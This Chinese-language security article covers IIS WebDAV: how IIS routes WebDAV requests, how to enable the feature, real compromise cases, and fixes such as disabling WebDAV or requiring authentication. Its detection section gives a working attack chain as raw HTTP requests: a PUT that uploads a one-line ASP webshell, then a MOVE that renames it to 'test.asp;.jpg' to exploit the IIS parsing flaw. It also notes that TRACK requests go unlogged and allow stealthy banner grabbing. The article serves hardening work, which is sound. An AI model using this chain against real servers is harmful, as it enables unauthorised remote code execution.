# IIS WebDAV安全配置

### 0x00 简介

* * *

WebDAV是一种基于 HTTP 1.1协议的通信协议.它扩展了HTTP 1.1，在GET、POST、HEAD等几个HTTP标准方法以外添加了一些新的方法。

使应用程序可直接对Web Server直接读写，并支持写文件锁定(Locking)及解锁(Unlock)，还可以支持文件的版本控制。

IIS实现Webdav是采用的其两种接口CGI、ISAPI的ISAPI接口。

但因为其没有采用影射的方式，所以IIS的主程序w3svc.dll本身包含了Webdav的信息。

其识别出是Webdav的请求后就调用Webdav的处理模块httpext.dll。

对于常见几种请求方法`GET、HEAD、POST`等，因为常见一些映射都支持。

所以不能以请求方法作为Webdav请求的判断，w3svc.dll就根据请求头的字段识别。

如果请求头里面包含`Translate:`、`If:`、`Lock-Token:`中的一种，就认为是Webdav的请求。

`Translate:`就是那个`Translate:f`的泄露源代码的一个请求头，其实设置别的两个也是一样的。

可能很多IDS是没有这点知识的。W3svc.dll还内置了几个别的请求方法`TRACK`、`TRACE`等。

`TRACK`就是用于调试错误的，如果收到这样的请求头，w3svc.dll会原样返回请求数据。

相当于我们常见的ping.exe。

IIS对`TRACK`请求没有进行LOG记录，这点我们可以用于来获得banner。

对于IIS将优于大家习惯使用的`HEAD`。

如果上面的请求方法没匹配，那么w3svc.dll就会认为是Webdav的请求，交给httpext.dll处理了。

这些请求包含Webdav支持的`PROPFIND`、`PROPPATCH`、`MKCOL`、`DELETE`、`PUT`、`COPY`、`MOVE`、`LOCK`、`UNLOCK`等。

### 0x01 配置

* * *

为了安全上的考虑，IIS默认并不会启动WebDAV的功能，因此必须另外来激活它。

通过启动“IIS管理器”，展开本地计算机，选择“Web服务扩展”，选择“允许”的途径来启动WebDAV功能。

开启WebDAV之后，IIS就支持`PROPFIND`、`PROPPATCH`、`MKCOL`、`DELETE`、`PUT`、`COPY`、`MOVE`、`LOCK`、`UNLOCK`等方法了。

![enter image description here](http://drops.javaweb.org/uploads/images/ea43a37385ae5c071326b70c30b3e3c81405b11e.jpg)

当IIS中的配置允许写入的时候就可以直接PUT文件上去，由此可能引发非常严重的安全问题，强烈建议禁制

![enter image description here](http://drops.javaweb.org/uploads/images/30cdb5f44bd056bb33cde34098aa5b84ac423b6f.jpg)

### 0x02 危害

* * *

当开启了WebDAV后，IIS中又配置了目录可写，便会产生很严重的问题。 wooyun上由此配置产生的问题很多，并且有老外黑了一群中国政府站有一部分就是由于此配置。 危害巨大，操作简单，直接批量扫描，上传shell。

[WooYun: 闪动科技webserver配置不当可取shell](http://www.wooyun.org/bugs/wooyun-2013-018158)

[WooYun: 瑞达信息安全产业股份有限公司IIS写入漏洞](http://www.wooyun.org/bugs/wooyun-2011-02238)

[WooYun: 海航webdav漏洞导致服务器沦陷](http://www.wooyun.org/bugs/wooyun-2011-02765)

[WooYun: 阿里某邮件系统服务器配置不当](http://www.wooyun.org/bugs/wooyun-2011-03581)

[WooYun: 国家某局某文件系统存在严重安全问题](http://www.wooyun.org/bugs/wooyun-2012-05911)

[WooYun: 国内某大型风电工控系统应用配置失误](http://www.wooyun.org/bugs/wooyun-2012-06196)

### 0x03 查找存在问题的服务器

* * *

对服务器发送OPTION包：

```
OPTIONS / HTTP/1.1
Host: www.test.com

```

返回响应头如下：

```
HTTP/1.1 200 OK
Server: Microsoft-IIS/6.0
X-Powered-By: ASP.NET
MS-Author-Via: DAV
Content-Length: 0
Accept-Ranges: none
DASL: <DAV:sql>
DAV: 1, 2
Public: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
Cache-Control: private

```

当ALLOW中包含如上方法时，可以确定服务器开启了WebDAV。

此时可以用PUT上传文件，但是不可以直接上传可执行脚本文件，可以先上传一个其他类型的文件，然后MOVE成脚本文件。

```
PUT /test.txt HTTP/1.1
Host: www.test.com
Content-Length: 23

<%eval request("a")%>

```

启用了“WebDAV”扩展，并且复选了“写入”，就可以写入txt文件了。要想使用MOVE命令将其更名为脚本文件后缀，必须还复选上“脚本资源访问”。

但是发现利用IIS的解析漏洞，可以MOVE成`test.asp;.jpg`，然后就可以当做shell来执行了

```
MOVE /test.txt HTTP/1.1
Host: www.test.com
Destination: http://www.test.com/test.asp;.jpg

```

有一个开源的DAV管理工具，使用工具直接查看：

[http://www.davexplorer.org/download.html](http://www.davexplorer.org/download.html)

### 0x03 修复方案

* * *

#### 1 禁用WebDAV。

通常情况下网站不需要支持额外的方法，右键WebDAV，点击禁用即可。

#### 2 如果要使用WebDAV的话，加上权限验证。

如果选取“脚本资源访问”，则用户将具备修改WebADV文件夹内的脚本文说明件(scriptfile)的功能。

除了此处的虚拟目录权限外，还需要视NTFS权限，才可以决定用户是否有权限来访问WebDAV文件夹内的文件。

WebDAV文件夹的NTFS权限给予用户适当的NTFS权限。

首先请设置让Everyone组只有“读取”的权限，然后再针对个别用户给予“写入”的权限，例如我们给予用户“User”写入的权限。

选择验证用户身份的方法启动“IIS管理器”，然后右击WebDAV虚拟目录，选择“属性”→“目录安全性”，单击“身份验证和访问控制”处的编辑按钮。

不要选取“启用匿名访问”，以免招致攻击。选择安全的验证方法，选择“集成Windows身份验证”。

![enter image description here](http://drops.javaweb.org/uploads/images/6c772572f00ac65be3ab765c20222826b46d0e72.jpg)

参考：

[http://hi.baidu.com/yuange1975/item/a836d31096b5b959f1090e89](http://hi.baidu.com/yuange1975/item/a836d31096b5b959f1090e89)

[http://www.daxigua.com/archives/1597](http://www.daxigua.com/archives/1597)

[http://www.daxigua.com/archives/2750](http://www.daxigua.com/archives/2750)

[http://www.daxigua.com/archives/2747](http://www.daxigua.com/archives/2747)

[http://blog.163.com/wfruee@126/blog/static/4116699420123261427232/](http://blog.163.com/wfruee@126/blog/static/4116699420123261427232/)